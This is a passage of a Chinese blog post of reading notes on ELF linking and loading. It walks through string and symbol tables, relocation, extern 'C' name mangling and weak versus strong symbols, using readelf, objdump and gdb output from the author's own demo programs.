<h2 id="String-table-Shstrtab"><a href="#String-table-Shstrtab" class="headerlink" title="String table &amp;&amp; Shstrtab"></a>String table &amp;&amp; Shstrtab</h2><blockquote>
<p>分别用来保存符号表的名称和节表的名称，即symbol name和section name。可通过st_name和sh_name索引来访问。</p>
</blockquote>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">符号表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">13</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS elfdemo.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> .data</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">4</span> .bss</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .rodata</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT    <span class="number">3</span> static_var<span class="number">.1</span></span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> static_var2<span class="number">.0</span></span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> global_init_var</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">4</span> global_uninit_var</span><br><span class="line">    <span class="number">10</span>: <span class="number">0000000000000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> func1</span><br><span class="line">    <span class="number">11</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br><span class="line">    <span class="number">12</span>: <span class="number">000000000000002b</span>    <span class="number">55</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 符号表的hex表示，可以理解其存储的格式</span></span><br><span class="line"><span class="comment"> 第一列为索引，注意大端法，一个结构体占24字节，仔细阅读可以理解其与字符串表的对应关系。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 11 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.symtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">01000000</span> <span class="number">0400f</span>1ff ................</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">00000000</span> <span class="number">03000100</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03000300</span> ................</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000060</span> <span class="number">00000000</span> <span class="number">03000400</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03000500</span> ................</span><br><span class="line">  <span class="number">0x00000080</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000090</span> <span class="number">0b000000</span> <span class="number">01000300</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000a0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">18000000</span> <span class="number">01000400</span> ................</span><br><span class="line">  <span class="number">0x000000b0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000c0</span> <span class="number">26000000</span> <span class="number">11000300</span> <span class="number">00000000</span> <span class="number">00000000</span> &amp;...............</span><br><span class="line">  <span class="number">0x000000d0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">36000000</span> <span class="number">11000400</span> .......<span class="number">.6</span>.......</span><br><span class="line">  <span class="number">0x000000e0</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000f0</span> <span class="number">48000000</span> <span class="number">12000100</span> <span class="number">00000000</span> <span class="number">00000000</span> H...............</span><br><span class="line">  <span class="number">0x00000100</span> <span class="number">2b</span>000000 <span class="number">00000000</span> <span class="number">4e000000</span> <span class="number">10000000</span> +.......N.......</span><br><span class="line">  <span class="number">0x00000110</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000120</span> <span class="number">55000000</span> <span class="number">12000100</span> <span class="number">2b</span>000000 <span class="number">00000000</span> U.......+.......</span><br><span class="line">  <span class="number">0x00000130</span> <span class="number">37000000</span> <span class="number">00000000</span>                   <span class="number">7.</span>......</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 字符串表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 12 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.strtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">00656</span>c66 <span class="number">64656</span>d6f <span class="number">2e630073</span> <span class="number">74617469</span> .elfdemo.c.stati</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">635f</span>7661 <span class="number">722e3100</span> <span class="number">73746174</span> <span class="number">69635f</span>76 c_var<span class="number">.1</span>.static_v</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">6172322</span>e <span class="number">3000676</span>c <span class="number">6f</span>62616c <span class="number">5f</span>696e69 ar2<span class="number">.0</span>.global_ini</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">745f</span>7661 <span class="number">7200676</span>c <span class="number">6f</span>62616c <span class="number">5f</span>756e69 t_var.global_uni</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">6e69745</span>f <span class="number">76617200</span> <span class="number">66756e63</span> <span class="number">31007072</span> nit_var.func1.pr</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">696e7466</span> <span class="number">006</span>d6169 <span class="number">6e00</span>              intf.main.</span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 13 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.shstrtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">002e7379</span> <span class="number">6</span>d746162 <span class="number">002e7374</span> <span class="number">72746162</span> ..symtab..strtab</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">002e7368</span> <span class="number">73747274</span> <span class="number">6162002</span>e <span class="number">72656</span>c61 ..shstrtab..rela</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">2e746578</span> <span class="number">74002e64</span> <span class="number">61746100</span> <span class="number">2e627373</span> .text..data..bss</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">002e726</span>f <span class="number">64617461</span> <span class="number">002e636</span>f <span class="number">6</span>d6d656e ..rodata..commen</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">74002e6</span>e <span class="number">6f</span>74652e <span class="number">474e552</span>d <span class="number">73746163</span> t..note.GNU-stac</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">6b</span>002e6e <span class="number">6f</span>74652e <span class="number">676e752</span>e <span class="number">70726f</span>70 k..note.gnu.prop</span><br><span class="line">  <span class="number">0x00000060</span> <span class="number">65727479</span> <span class="number">002e7265</span> <span class="number">6</span>c612e65 <span class="number">685f</span>6672 erty..rela.eh_fr</span><br><span class="line">  <span class="number">0x00000070</span> <span class="number">616</span>d6500                            ame.        </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="关于重定位节"><a href="#关于重定位节" class="headerlink" title="关于重定位节"></a>关于重定位节</h2><blockquote>
<p>因此是一个可重定位文件缺少外部文件函数的定义，因此需要链接器来重定位，而.rela就是需要重定位的节</p>
</blockquote>
<p>此时可以反汇编文件，文件是这样的：仔细观察可以看见call字段地址为00 00 00 00，故需要重定位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -d elfdemo.o</span></span><br><span class="line"></span><br><span class="line">elfdemo.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;func1&gt;:</span><br><span class="line">   <span class="number">0</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">   <span class="number">4</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">5</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">   c:   <span class="number">89</span> <span class="number">7</span>d fc                mov    %edi,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">   f:   <span class="number">8b</span> <span class="number">45</span> fc                mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">  <span class="number">12</span>:   <span class="number">89</span> c6                   mov    %eax,%esi</span><br><span class="line">  <span class="number">14</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rax        # <span class="number">1b</span> &lt;func1+<span class="number">0x1b</span>&gt;</span><br><span class="line">  <span class="number">1b</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">1</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">23</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">28</span> &lt;func1+<span class="number">0x28</span>&gt;</span><br><span class="line">  <span class="number">28</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">29</span>:   c9                      leave  </span><br><span class="line">  <span class="number">2</span>a:   c3                      ret    </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000002b</span> &lt;main&gt;:</span><br><span class="line">  <span class="number">2b</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">  <span class="number">2f</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">  <span class="number">30</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">  <span class="number">33</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">  <span class="number">37</span>:   c7 <span class="number">45</span> f8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x1</span>,<span class="number">-0x8</span>(%rbp)</span><br><span class="line">  <span class="number">3</span>e:   <span class="number">8b</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%edx        # <span class="number">44</span> &lt;main+<span class="number">0x19</span>&gt;</span><br><span class="line">  <span class="number">44</span>:   <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%eax        # <span class="number">4</span>a &lt;main+<span class="number">0x1f</span>&gt;</span><br><span class="line">  <span class="number">4</span>a:   <span class="number">01</span> c2                   add    %eax,%edx</span><br><span class="line">  <span class="number">4</span>c:   <span class="number">8b</span> <span class="number">45</span> f8                mov    <span class="number">-0x8</span>(%rbp),%eax</span><br><span class="line">  <span class="number">4f</span>:   <span class="number">01</span> c2                   add    %eax,%edx</span><br><span class="line">  <span class="number">51</span>:   <span class="number">8b</span> <span class="number">45</span> fc                mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">  <span class="number">54</span>:   <span class="number">01</span> d0                   add    %edx,%eax</span><br><span class="line">  <span class="number">56</span>:   <span class="number">89</span> c7                   mov    %eax,%edi</span><br><span class="line">  <span class="number">58</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">5</span>d &lt;main+<span class="number">0x32</span>&gt;</span><br><span class="line">  <span class="number">5</span>d:   <span class="number">8b</span> <span class="number">45</span> f8                mov    <span class="number">-0x8</span>(%rbp),%eax</span><br><span class="line">  <span class="number">60</span>:   c9                      leave  </span><br><span class="line">  <span class="number">61</span>:   c3                      ret    </span><br></pre></td></tr></table></figure>

<p>可以观察到重定位之后符号表的变化，主要是变化为装载地址的相对地址：</p>
<blockquote>
<p>可以通过gdb来验证</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">41</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS Scrt1.o</span><br><span class="line">     <span class="number">2</span>: <span class="number">000000000000038</span>c    <span class="number">32</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> __abi_tag</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000001090</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> deregister_tm_clones</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000000010</span>c0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> register_tm_clones</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000001100</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> __do_global_dtors_aux</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000004018</span>     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">26</span> completed<span class="number">.0</span></span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000003</span>dc0     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">22</span> __do_global_dtor[...]</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000001140</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> frame_dummy</span><br><span class="line">    <span class="number">10</span>: <span class="number">0000000000003</span>db8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">21</span> __frame_dummy_in[...]</span><br><span class="line">    <span class="number">11</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS elfdemo.c</span><br><span class="line">    <span class="number">12</span>: <span class="number">0000000000004014</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> static_var<span class="number">.1</span></span><br><span class="line">    <span class="number">13</span>: <span class="number">0000000000004020</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">26</span> static_var2<span class="number">.0</span></span><br><span class="line">    <span class="number">14</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">15</span>: <span class="number">0000000000002110</span>     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __FRAME_END__</span><br><span class="line">    <span class="number">16</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    <span class="number">17</span>: <span class="number">0000000000003</span>dc8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">23</span> _DYNAMIC</span><br><span class="line">    <span class="number">18</span>: <span class="number">0000000000002008</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT   <span class="number">19</span> __GNU_EH_FRAME_HDR</span><br><span class="line">    <span class="number">19</span>: <span class="number">0000000000003f</span>b8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">24</span> _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">20</span>: <span class="number">0000000000001149</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> func1</span><br><span class="line">    <span class="number">21</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]</span><br><span class="line">    <span class="number">22</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    <span class="number">23</span>: <span class="number">0000000000004000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT   <span class="number">25</span> data_start</span><br><span class="line">    <span class="number">24</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">25</span> _edata</span><br><span class="line">    <span class="number">25</span>: <span class="number">00000000000011</span>ac     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">17</span> _fini</span><br><span class="line">    <span class="number">26</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND <span class="built_in">printf</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">    <span class="number">27</span>: <span class="number">0000000000004000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">25</span> __data_start</span><br><span class="line">    <span class="number">28</span>: <span class="number">000000000000401</span>c     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">26</span> global_uninit_var</span><br><span class="line">    <span class="number">29</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    <span class="number">30</span>: <span class="number">0000000000004008</span>     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">25</span> __dso_handle</span><br><span class="line">    <span class="number">31</span>: <span class="number">0000000000002000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">18</span> _IO_stdin_used</span><br><span class="line">    <span class="number">32</span>: <span class="number">0000000000004028</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">26</span> _end</span><br><span class="line">    <span class="number">33</span>: <span class="number">0000000000001060</span>    <span class="number">38</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> _start</span><br><span class="line">    <span class="number">34</span>: <span class="number">0000000000004010</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">25</span> global_init_var</span><br><span class="line">    <span class="number">35</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">26</span> __bss_start</span><br><span class="line">    <span class="number">36</span>: <span class="number">0000000000001174</span>    <span class="number">55</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> main</span><br><span class="line">    <span class="number">37</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">25</span> __TMC_END__</span><br><span class="line">    <span class="number">38</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    <span class="number">39</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br><span class="line">    <span class="number">40</span>: <span class="number">0000000000001000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">12</span> _init</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r--p     <span class="number">1000</span>      <span class="number">0</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555555000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">1000</span>   <span class="number">1000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555556000</span>     <span class="number">0x555555557000</span> r--p     <span class="number">1000</span>   <span class="number">2000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555557000</span>     <span class="number">0x555555558000</span> r--p     <span class="number">1000</span>   <span class="number">2000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555558000</span>     <span class="number">0x555555559000</span> rw-p     <span class="number">1000</span>   <span class="number">3000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x7ffff7d86000</span>     <span class="number">0x7ffff7d89000</span> rw-p     <span class="number">3000</span>      <span class="number">0</span> [anon_7ffff7d86]</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x555555558000</span>+<span class="number">0x14</span></span><br><span class="line"><span class="number">0x555555558014</span> &lt;static_var<span class="number">.1</span>&gt;:  <span class="number">0x0000000000000055</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558024</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558034</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558044</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558054</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558064</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558074</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558084</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558094</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555580a4</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<h3 id="符号表中符号可以大致分为如下几类"><a href="#符号表中符号可以大致分为如下几类" class="headerlink" title="符号表中符号可以大致分为如下几类"></a>符号表中符号可以大致分为如下几类</h3><blockquote>
<p>（真实性有待商榷，没有链接器的实现基础）</p>
</blockquote>
<ul>
<li>能被外部引用的，无static关键字修饰的全局符号</li>
<li>static修饰的符号</li>
<li>本程序引用的外部符号，如本程序的printf函数</li>
<li>段名</li>
</ul>
<h3 id="一些杂记"><a href="#一些杂记" class="headerlink" title="一些杂记"></a>一些杂记</h3><blockquote>
<p>c++中会支持函数重载，也就是同名函数会经过其所在类，命名空间，参数类型，符号类型等再次修饰，导致虽然变量名一样但是其实编译之后是不一样的，所以可以支持这个特性，但是问题是，若想要c++兼容c库就不是那么好办了，c中没有此特性，因此c++中使用c库的函数声明就会被重载，导致符号位定义错误，具体如下：</p>
</blockquote>
<h4 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*c的库文件貌似适配做的很好，如果直接包含c库文件是不会出现这个问题的，就当是一个小知识吧*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">会出现：</span><br><span class="line">root@L:/home/l/c++<span class="meta"># g++ extern.cpp -o ex</span></span><br><span class="line">/usr/bin/ld: /tmp/cctEKkS7.o: in function `main<span class="number">&#x27;</span>:</span><br><span class="line"><span class="keyword">extern</span>.cpp:(.text+<span class="number">0x23</span>): undefined reference to `<span class="built_in">printf</span>(<span class="type">char</span> <span class="type">const</span>*, ...)&#x27;</span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br><span class="line">如果这样就会告诉编译器不会命名修饰，因此可以编译成功</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="强弱符号与强弱引用"><a href="#强弱符号与强弱引用" class="headerlink" title="强弱符号与强弱引用"></a>强弱符号与强弱引用</h4><blockquote>
<p>强弱符号可以解决同名冲突的问题，若遇上同名的定义符号，优先使用强符号，注意是对定义而言，而非引用（声明）。</p>
</blockquote>
<p><img src="/img/mypic/strsym.png" alt="strsym"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,week2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++# ./strong </span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>强引用弱引用则是可以当外部引用找不到定义的时候不报错，增加了程序的容错性。</p>
<p>但是注意执行的时候还是会报错，call的时候会把一个无效地址给rip，导致segment fault（非法地址访问）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__attribute__((weak)) <span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    foo();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc strong.c -o strong</span></span><br><span class="line">root@L:/home/l/c++# </span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
  <entry>
    <title>关于动态链接</title>
